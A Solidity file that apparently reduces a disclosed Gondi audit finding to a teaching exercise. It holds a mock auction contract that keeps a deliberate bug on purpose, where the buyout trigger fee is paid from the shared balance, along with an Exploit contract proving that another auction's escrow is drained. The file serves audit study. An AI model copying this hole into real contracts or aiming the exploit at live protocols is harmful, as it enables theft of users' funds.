// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Gondi — [H-05] triggerFee is stolen from other auctions during
    settleWithBuyout() (Code4rena 2024-04-gondi, finding #35207,
    reporter minhquanym).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: settleWithBuyout pays the auction originator's triggerFee
    with `asset.safeTransfer(originator, fee)` — i.e. from the AUCTION
    CONTRACT's balance — instead of `safeTransferFrom(buyer, originator, fee)`.
    The main lender never deposits the fee. When another auction's bid/escrow
    sits in the same contract, the fee is siphoned from those funds, leaving
    later auctions unable to settle (loss of principal to other auctions).

    Blamed line preserved: asset.safeTransfer(_auction.originator, fee).
//////////////////////////////////////////////////////////////////////////*/

library SafeTransferLib {
    function safeTransfer(MockERC20 token, address to, uint256 amount) internal {
        require(token.transfer(to, amount), "xfer");
    }

    function safeTransferFrom(MockERC20 token, address from, address to, uint256 amount) internal {
        require(token.transferFrom(from, to, amount), "xferFrom");
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal loan handle used by settleWithBuyout.
contract MultiSourceLoanStub {
    function loanLiquidated(uint256, /*loanId*/ bytes32 /*loanHash*/) external pure {
        // no-op accounting for the reduction
    }
}

/// @notice Reduced liquidation auction house. Multiple auctions share one
///         contract balance of `asset` — the bug lets buyout steal from it.
contract AuctionHouse {
    using SafeTransferLib for MockERC20;

    uint256 internal constant _BPS = 10_000;

    struct Auction {
        address asset;
        address originator; // who triggered the auction (earns triggerFee)
        address loanAddress;
        uint256 loanId;
        uint256 triggerFee; // in BPS of totalOwed
        uint256 escrowed; // funds belonging to THIS auction (other lenders / bids)
        bool settled;
    }

    struct Tranche {
        address lender;
        uint256 owed;
    }

    struct LoanView {
        Tranche[] tranche;
    }

    MultiSourceLoanStub public immutable loanContract;
    mapping(uint256 => Auction) public auctions;
    mapping(uint256 => LoanView) private _loans;
    uint256 public nextAuctionId = 1;

    constructor(MultiSourceLoanStub _loan) {
        loanContract = _loan;
    }

    /// @notice Open an auction and escrow `amount` of asset for it (other
    ///         lenders' capital / prior bids sitting in the contract).
    function openAuction(
        address asset,
        address originator,
        uint256 triggerFeeBps,
        address[] calldata lenders,
        uint256[] calldata owed
    ) external returns (uint256 id) {
        require(lenders.length == owed.length && lenders.length > 0, "tranches");
        id = nextAuctionId++;
        uint256 total;
        Tranche[] storage t = _loans[id].tranche;
        for (uint256 i; i < lenders.length; i++) {
            t.push(Tranche(lenders[i], owed[i]));
            total += owed[i];
        }
        // Escrow the auction's funds into the house (from caller).
        MockERC20(asset).transferFrom(msg.sender, address(this), total);
        auctions[id] = Auction({
            asset: asset,
            originator: originator,
            loanAddress: address(loanContract),
            loanId: id,
            triggerFee: triggerFeeBps,
            escrowed: total,
            settled: false
        });
    }

    /// @notice Main lender buys out: repays other lenders, pays triggerFee.
    ///         BUG: triggerFee taken from contract balance, not from buyer.
    function settleWithBuyout(uint256 auctionId) external {
        Auction storage _auction = auctions[auctionId];
        require(!_auction.settled, "settled");
        LoanView storage _loan = _loans[auctionId];

        MockERC20 asset = MockERC20(_auction.asset);
        uint256 totalOwed;
        // Repay other lenders — buyer funds these transfers.
        for (uint256 i; i < _loan.tranche.length;) {
            uint256 owed = _loan.tranche[i].owed;
            totalOwed += owed;
            // Pull repayment from the main lender (buyer = msg.sender).
            asset.safeTransferFrom(msg.sender, _loan.tranche[i].lender, owed);
            unchecked {
                ++i;
            }
        }

        MultiSourceLoanStub(_auction.loanAddress).loanLiquidated(_auction.loanId, bytes32(0));

        // @> VULN: triggerFee paid from the CONTRACT balance via safeTransfer,
        // not from the buyer via safeTransferFrom. Steals escrow belonging to
        // other auctions sharing this balance.
        // FIX: asset.safeTransferFrom(msg.sender, _auction.originator, fee);
        uint256 fee = (totalOwed * _auction.triggerFee) / _BPS;
        asset.safeTransfer(_auction.originator, fee);

        _auction.settled = true;
        // Accounting: this auction's escrow is notionally still here, but the
        // fee siphon may have eaten into OTHER auctions' escrow already.
        if (_auction.escrowed >= fee) {
            // In the buggy path the fee did not come from this auction's escrow
            // either — it came from whatever tokens were in the contract. We
            // leave escrowed unchanged to model "this auction still expects its
            // full escrow," exposing the shortfall at the contract level.
        }
    }

    function contractBalance(address asset) external view returns (uint256) {
        return MockERC20(asset).balanceOf(address(this));
    }
}

/// @notice Two auctions share the house. Settling auction B's buyout steals
///         triggerFee from auction A's escrowed principal.
contract Exploit {
    using SafeTransferLib for MockERC20;

    uint256 public constant AUCTION_A_ESCROW = 1000e18; // other auction's funds
    uint256 public constant AUCTION_B_OWED = 100e18; // buyout repays this to other lenders
    uint256 public constant TRIGGER_FEE_BPS = 1000; // 10%
    // fee = 100e18 * 1000 / 10000 = 10e18 stolen from contract balance

    MockERC20 public usdc;
    MultiSourceLoanStub public loanStub;
    AuctionHouse public house;

    address public constant ORIGINATOR_B = address(0x0B);
    address public constant LENDER_A = address(0xA1);
    address public constant LENDER_B_OTHER = address(0xB2); // other tranche of B

    uint256 public feeStolen;
    uint256 public auctionAShortfall;
    uint256 public originatorBalance;

    constructor() {
        // Fixed CREATE order:
        usdc = new MockERC20(); //                         nonce 1
        loanStub = new MultiSourceLoanStub(); //           nonce 2
        house = new AuctionHouse(loanStub); //             nonce 3

        // Fund this contract for both escrows + buyout repayment.
        usdc.mint(address(this), AUCTION_A_ESCROW + AUCTION_B_OWED + AUCTION_B_OWED);
        usdc.approve(address(house), type(uint256).max);
    }

    function run() external {
        // 1. Auction A: large escrow sitting in the house (other lenders' $).
        address[] memory lendersA = new address[](1);
        uint256[] memory owedA = new uint256[](1);
        lendersA[0] = LENDER_A;
        owedA[0] = AUCTION_A_ESCROW;
        uint256 idA = house.openAuction(address(usdc), address(0x0A), TRIGGER_FEE_BPS, lendersA, owedA);
        require(house.contractBalance(address(usdc)) == AUCTION_A_ESCROW, "A escrowed");

        // 2. Auction B: smaller auction; originator will receive triggerFee.
        address[] memory lendersB = new address[](1);
        uint256[] memory owedB = new uint256[](1);
        lendersB[0] = LENDER_B_OTHER;
        owedB[0] = AUCTION_B_OWED;
        uint256 idB = house.openAuction(address(usdc), ORIGINATOR_B, TRIGGER_FEE_BPS, lendersB, owedB);
        // Contract now holds A + B escrow.
        require(
            house.contractBalance(address(usdc)) == AUCTION_A_ESCROW + AUCTION_B_OWED,
            "A+B escrowed"
        );

        // 3. Main lender settles B with buyout. Pays B's other lenders from
        //    own pocket, but triggerFee is taken from the shared balance.
        // Approve house to pull buyout repayment.
        usdc.approve(address(house), AUCTION_B_OWED);
        house.settleWithBuyout(idB);

        feeStolen = (AUCTION_B_OWED * TRIGGER_FEE_BPS) / 10_000; // 10e18
        originatorBalance = usdc.balanceOf(ORIGINATOR_B);
        uint256 remaining = house.contractBalance(address(usdc));

        // After buyout: B's escrow (100e18) should still be in the contract
        // (buyout path doesn't consume it in this reduction) PLUS A's 1000e18,
        // MINUS the 10e18 fee stolen from the shared balance.
        // remaining = 1100e18 - 10e18 = 1090e18
        // Auction A still "expects" 1000e18; B expects 100e18; total expected
        // 1100e18 but only 1090e18 left → shortfall of feeStolen.
        uint256 expectedEscrow = AUCTION_A_ESCROW + AUCTION_B_OWED;
        auctionAShortfall = expectedEscrow - remaining;

        // HARM: originator received the fee from other auctions' funds; the
        // shared balance is short by exactly the triggerFee.
        require(originatorBalance == feeStolen, "originator got fee");
        require(auctionAShortfall == feeStolen, "shortfall == stolen fee");
        require(remaining == expectedEscrow - feeStolen, "balance drained by fee");
        // silence idA
        idA;
    }
}
